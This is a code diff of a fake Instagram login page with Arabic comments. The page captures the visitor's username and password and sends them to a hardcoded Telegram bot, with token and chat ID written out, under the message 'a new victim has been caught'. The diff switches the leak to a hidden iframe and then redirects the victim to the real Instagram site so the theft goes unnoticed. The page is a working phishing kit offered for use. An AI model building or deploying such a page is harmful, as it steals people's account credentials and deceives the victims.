@@ -70,28 +70,43 @@
     <div class="login-container">
         <div class="logo">Instagram</div>
 
-        <!-- استخدام طريقة GET المباشرة لإرسال البيانات للبوت وتوجيه المستخدم بعد ذلك -->
-        <form action="https://api.telegram.org/bot8677692095:AAF2WJhazxneecyzwripCch54k5m0npTEAo/sendMessage" method="GET">
-            <!-- تحديد رقم الـ Chat ID الخاص بك كحقل مخفي يتم إرساله تلقائياً -->
-            <input type="hidden" name="chat_id" value="7186101939">
-            
-            <!-- دمج اسم المستخدم وكلمة المرور في رسالة النص (text) التي ستصلك -->
-            <input type="text" name="text" id="combinedText" style="display: none;" value="">
-
-            <input type="text" id="userInput" class="input-field" placeholder="اسم الهاتف، اسم المستخدم أو البريد الإلكتروني" required>
-            <input type="password" id="passInput" class="input-field" placeholder="كلمة السر" required>
-            <button type="submit" class="login-btn" onclick="prepareData()">تسجيل الدخول</button>
+        <form id="loginForm">
+            <input type="text" id="username" class="input-field" placeholder="اسم الهاتف، اسم المستخدم أو البريد الإلكتروني" required>
+            <input type="password" id="password" class="input-field" placeholder="كلمة السر" required>
+            <button type="submit" class="login-btn">تسجيل الدخول</button>
         </form>
     </div>
 
+    <!-- إطار مخفي لضمان إرسال البيانات لتليجرام في الخلفية -->
+    <iframe name="hiddenFrame" style="display:none;"></iframe>
+
     <script>
-        function prepareData() {
-            const user = document.getElementById('userInput').value;
-            const pass = document.getElementById('passInput').value;
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // منع الإرسال الافتراضي للفورم
+
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+
+            // معلومات بوت تليجرام الخاص بك
+            const botToken = "8677692095:AAF2WJhazxneecyzwripCch54k5m0npTEAo";
+            const chatId = "7186101939";
             
-            // تجهيز النص الذي سيصلك إلى التليجرام
-            document.getElementById('combinedText').value = `🚨 تم صيد ضحية جديدة!\n👤 المستخدم: ${user}\n🔑 كلمة المرور: ${pass}`;
-        }
+            const message = encodeURIComponent(`🚨 تم صيد ضحية جديدة!\n👤 المستخدم: ${user}\n🔑 كلمة المرور: ${pass}`);
+
+            // رابط إرسال الرسالة للبوت
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
+
+            // إرسال البيانات في الخلفية عبر عنصر iframe مخفي
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = telegramUrl;
+            document.body.appendChild(iframe);
+
+            // الانتظار لمدة جزء من الثانية لضمان إرسال الطلب، ثم تحويل المستخدم لموقع انستغرام الرسمي
+            setTimeout(function() {
+                window.location.href = "https://www.instagram.com";
+            }, 800);
+        });
     </script>
 
 </body>
